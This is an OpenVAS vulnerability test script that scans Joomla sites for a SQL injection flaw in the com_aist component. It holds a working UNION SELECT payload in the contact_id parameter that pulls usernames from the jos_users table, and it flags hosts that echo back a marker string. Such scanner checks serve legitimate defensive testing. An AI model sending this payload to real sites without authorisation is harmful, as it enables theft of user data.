##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_aist_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Joomla Component 'com_aist' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801787");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-05-18 15:37:30 +0200 (Wed, 18 May 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Joomla Component com_aist SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100891/joomlaaist-sql.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to injection arbitrary SQL
constructs and gain sensitive information.");

  script_tag(name:"affected", value:"Joomla! Aist component");

  script_tag(name:"insight", value:"Input passed via the 'view' parameter to 'index.php' is not properly
sanitised before using to construct SQL queries.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Joomla! and is prone to SQL injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

sndReq = http_get(item: dir + '/index.php?option=com_aist&view=vaca' +
                              'ncylist&contact_id=-3 AND 1=2 UNION SELECT 1,2,3,4,group_concat(username,' +
                              '0x3a,0x4f70656e564153)g3mb3lzfeatnuxbie,6,7,8,9,10,11,12,13,14,15,16,' +
                              '17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36 from ' +
                              'jos_users--', port: port);
rcvRes = http_send_recv(port:port, data:sndReq);

if('> admin:OpenVAS(.+):OpenVAS<' >< rcvRes){
  security_message(port: port);
  exit(0);
}

exit(99);
